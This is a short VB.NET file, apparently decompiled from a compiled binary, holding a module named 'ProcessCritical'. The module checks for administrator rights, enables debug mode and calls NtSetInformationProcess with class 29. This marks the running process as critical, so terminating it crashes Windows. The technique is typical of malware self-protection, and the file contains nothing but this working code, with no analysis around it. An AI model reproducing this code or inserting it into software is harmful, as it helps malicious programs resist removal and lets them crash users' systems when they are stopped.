﻿Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Security.Principal

Namespace Complex
	' Token: 0x02000007 RID: 7
	Public Module ProcessCritical
		' Token: 0x06000033 RID: 51
		Private Declare Function NtSetInformationProcess Lib "ntdll.dll" (hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer

		' Token: 0x06000034 RID: 52 RVA: 0x000071CC File Offset: 0x000053CC
		Public Sub ProtectMyProcess()
			If ProcessCritical.IsAdmin() Then
				ProcessCritical.YesItIs()
			End If
		End Sub

		' Token: 0x06000035 RID: 53 RVA: 0x000071EC File Offset: 0x000053EC
		Public Sub YesItIs()
			Dim num As Integer = 1
			Dim processInformationClass As Integer = 29
			Process.EnterDebugMode()
			ProcessCritical.NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, num, 4)
		End Sub

		' Token: 0x06000036 RID: 54 RVA: 0x0000721C File Offset: 0x0000541C
		Public Function IsAdmin() As Boolean
			Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
		End Function
	End Module
End Namespace
